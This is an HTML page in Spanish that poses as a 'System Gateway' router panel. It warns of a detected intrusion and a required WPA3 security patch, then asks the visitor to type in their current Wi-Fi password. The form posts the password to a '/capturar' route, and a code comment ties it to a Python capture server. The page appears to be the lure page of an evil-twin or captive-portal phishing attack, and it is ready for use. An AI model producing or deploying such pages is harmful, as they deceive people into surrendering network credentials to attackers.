<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Admin Panel - Actualización</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #e9ecef;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .card {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            max-width: 350px;
            width: 90%;
            text-align: center;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }

        h2 {
            color: #dc3545;
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }

        p {
            color: #666;
            font-size: 0.9rem;
            line-height: 1.4;
        }

        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 1rem;
        }

        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #0056b3;
        }

        .footer {
            margin-top: 20px;
            font-size: 0.7rem;
            color: #999;
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="logo">📡 System Gateway</div>
        <h2>Actualización de Seguridad Requerida</h2>
        <p>Se ha detectado un intento de intrusión en su red. Para re-autenticar su conexión y aplicar el parche WPA3,
            ingrese su clave actual.</p>

        <!-- IMPORTANTE: El 'action' debe coincidir con la ruta en Python -->
        <form action="/capturar" method="POST">
            <input type="password" name="password" placeholder="Contraseña Wi-Fi" required>
            <button type="submit">VERIFICAR Y ACTUALIZAR</button>
        </form>

        <div class="footer">ID de Dispositivo: ANUBIS-SENTINEL-X5</div>
    </div>
</body>

</html>
